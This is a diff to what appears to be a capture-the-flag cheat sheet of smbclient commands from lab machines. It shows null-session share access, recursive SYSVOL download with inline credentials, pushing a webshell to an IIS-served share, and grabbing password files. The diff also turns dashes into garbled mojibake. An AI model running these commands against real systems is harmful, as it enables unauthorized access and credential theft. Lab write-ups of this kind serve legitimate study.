@@ -18,7 +18,7 @@ smbclient //TARGET_IP/software$ -N
 ```
 Used on: **Overwatch**
 
-- `-N` — no password (null session)
+- `-N` â€” no password (null session)
 
 ### Recursive download of SYSVOL
 ```bash
@@ -27,23 +27,30 @@ smbclient //TARGET_IP/SYSVOL -U overwatch.htb/sqlsvc%'TI0LKcfHzZw1Vv' \
 ```
 Used on: **Overwatch**
 
-- `-U DOMAIN/USER%PASSWORD` — inline credentials
-- `-c` — run a semicolon-separated command list non-interactively
-- `recurse ON; prompt OFF; mget *` — recursive mass-get without prompting
+- `-U DOMAIN/USER%PASSWORD` â€” inline credentials
+- `-c` â€” run a semicolon-separated command list non-interactively
+- `recurse ON; prompt OFF; mget *` â€” recursive mass-get without prompting
 
 ### Push a webshell to a writable share (one-shot upload)
 ```bash
 smbclient //$TARGET/nt4wrksv -U 'Bob%!P@$$W0rD!123' -c "put shell.asp"
 ```
-Used on: **Relevant** — landed `shell.asp` into a share mirrored by IIS at `:49663/nt4wrksv/`. Pair with [smb-write-iis-execution.md](../../exploits/web-rce/smb-write-iis-execution.md).
+Used on: **Relevant** â€” landed `shell.asp` into a share mirrored by IIS at `:49663/nt4wrksv/`. Pair with [smb-write-iis-execution.md](../../exploits/web-rce/smb-write-iis-execution.md).
 
-- `-U 'user%password'` — inline auth, single-quoted to protect `!`, `$`, `@`
-- `-c "put <local>"` — non-interactive single command
+- `-U 'user%password'` â€” inline auth, single-quoted to protect `!`, `$`, `@`
+- `-c "put <local>"` â€” non-interactive single command
 
 ### Anonymous read + grab a file
 ```bash
 smbclient //$TARGET/nt4wrksv -N -c "get passwords.txt"
 ```
-Used on: **Relevant** — `passwords.txt` contained base64-encoded creds (see [base64-encoded-credentials.md](../../exploits/creds/base64-encoded-credentials.md)).
+Used on: **Relevant** â€” `passwords.txt` contained base64-encoded creds (see [base64-encoded-credentials.md](../../exploits/creds/base64-encoded-credentials.md)).
+
+### Anonymous share walk with recursive download
+```bash
+smbclient //$TARGET/anonymous
+mget *
+```
+Used on: **Skynet** â€” guest access exposed internal notes and password-related files under the anonymous share.
 
 
